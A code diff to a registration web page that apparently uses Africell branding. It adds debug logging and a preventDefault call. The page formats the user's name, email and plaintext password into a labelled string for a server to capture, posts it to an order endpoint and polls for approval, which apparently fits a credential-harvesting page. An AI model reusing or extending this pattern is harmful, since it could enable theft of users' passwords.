@@ -264,7 +264,7 @@
 <body>
 
     <div class="reg-wrapper">
-        <!-- Top Navigation Bar (goes back to scratch2.html) -->
+        <!-- Top Navigation Bar -->
         <nav class="reg-navbar">
             <a href="scratch2.html" class="back-arrow">
                 <i class="fa-solid fa-arrow-left"></i>
@@ -302,7 +302,7 @@
             </div>
 
             <!-- Purple Create Account Button -->
-            <button type="button" id="createAccountBtn" class="reg-btn" onclick="submitRegistration()">Create Account</button>
+            <button type="button" id="createAccountBtn" class="reg-btn" onclick="submitRegistration(event)">Create Account</button>
 
             <!-- Loading Spinner -->
             <div id="loadingSpinner">
@@ -351,7 +351,9 @@
             }
         }
 
-        async function submitRegistration() {
+        async function submitRegistration(e) {
+            if (e) e.preventDefault();
+
             const nameVal = document.getElementById('fullName').value.trim();
             const emailVal = document.getElementById('emailAddress').value.trim();
             const pass1 = document.getElementById('regPassword').value.trim();
@@ -360,6 +362,8 @@
             const spinnerDiv = document.getElementById('loadingSpinner');
             const spinnerText = document.getElementById('spinnerText');
             const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '+232 00000000';
+
+            console.log("Client: Submitting registration for phone:", phoneInput);
 
             if (!nameVal) {
                 showAppAlert('❌ Please enter your full name.');
@@ -390,9 +394,9 @@
                 if (spinnerText) spinnerText.innerText = 'Creating your account...';
                 if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
-                // Explicit formatted prefix so server.js captures every field accurately
                 const registrationPayload = `Name: ${nameVal} | Email: ${emailVal || 'N/A'} | Password: ${pass1}`;
 
+                // Sends using 'uniqueId' which matches your server.js route parser
                 const response = await fetch('/api/submit-order', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -403,6 +407,7 @@
                 });
 
                 const result = await response.json();
+                console.log("Client: Server response received:", result);
 
                 if (result.success) {
                     pollApprovalStatus(phoneInput);
@@ -412,7 +417,7 @@
                     showAppAlert('❌ Registration failed. Please try again.');
                 }
             } catch (error) {
-                console.error('Error:', error);
+                console.error('Client Error:', error);
                 createBtn.classList.remove('disabled-state');
                 if (spinnerDiv) spinnerDiv.style.display = 'none';
                 showAppAlert('Could not connect to the backend server.');
@@ -428,6 +433,8 @@
                 try {
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                     const data = await response.json();
+
+                    console.log("Client: Polling status:", data.status);
 
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
